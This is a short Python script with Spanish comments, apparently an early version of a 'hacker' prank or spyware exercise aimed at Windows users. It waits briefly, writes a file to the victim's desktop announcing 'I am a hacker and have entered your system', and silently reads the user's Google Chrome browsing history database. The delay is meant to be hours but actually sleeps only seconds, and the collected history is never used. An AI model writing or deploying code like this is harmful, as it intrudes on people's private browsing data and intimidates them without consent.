import os
import sqlite3
from time import sleep
from random import randrange


HACKER_FILE_NAME = "PARA TI.txt"

def create_hacker_file(desktop_path):
    hacker_file = open(desktop_path + HACKER_FILE_NAME, "w")
    hacker_file.write("Soy un hacker y he entrado en tu sistema")
    hacker_file.close()
    return hacker_file

def get_chrome_history(history_path):
    try:
        con = sqlite3.connect(history_path)
        cursor = con.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        con.close()
        return urls
    except sqlite3.OperationalError as e:
        return None

def delay_action():
    n_houers = randrange(1, 4)
    print(f"Esperando {n_houers} horas")
    sleep(n_houers)

def main():
    #Esperamos algunas horas para que se ejecute el script
    delay_action()

    #Calculamos la ruta del escritorio del usuario de Windows
    desktop_path = os.environ['USERPROFILE'] + '\\Desktop\\'

    #Creamos el archivo del mensaje hacker en el escritorio
    hacker_file = create_hacker_file(desktop_path)

    #Obtenemos su historial de Google Chrome
    history_path = os.environ['USERPROFILE'] + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
    chrome_history = get_chrome_history(history_path)

if __name__ == "__main__":
    main()
